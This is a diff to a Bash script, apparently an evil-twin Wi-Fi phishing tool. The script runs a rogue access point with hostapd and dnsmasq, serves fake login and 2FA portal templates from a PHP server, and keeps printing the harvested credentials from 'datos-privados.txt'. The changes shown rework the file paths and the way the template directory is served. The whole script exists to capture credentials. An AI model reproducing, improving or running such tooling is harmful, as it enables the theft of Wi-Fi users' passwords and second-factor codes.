@@ -17,7 +17,7 @@ trap ctrl_c INT
 function ctrl_c(){
 	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
 	rm dnsmasq.conf hostapd.conf 2>/dev/null
-	rm -r *.php *.js *.txt *.ep assets portal_2fa Roboto-Regular.ttf iface 2>/dev/null
+	rm -r iface $template/datos-privados.txt $template/portal_2fa/datos-privados.txt 2>/dev/null
 	sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
 	iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
 	ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
@@ -80,7 +80,7 @@ function getCredentials(){
 	while true; do
 		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
 		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
-		cat datos-privados.txt portal_2fa/datos-privados.txt 2>/dev/null
+		cat $template/datos-privados.txt $template/portal_2fa/datos-privados.txt 2>/dev/null
 		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 		sleep 3; clear
 	done
@@ -163,11 +163,11 @@ function startAttack(){
 	done
 
 	if [ $check_plantillas -eq 1 ]; then
-		tput civis; cp -r $template/* .
+		tput civis; pushd $template > /dev/null 2>&1
 		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
 		php -S 192.168.1.1:80 > /dev/null 2>&1 &
 		sleep 2
-		getCredentials
+		popd > /dev/null 2>&1; getCredentials
 	else
 		tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
 		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
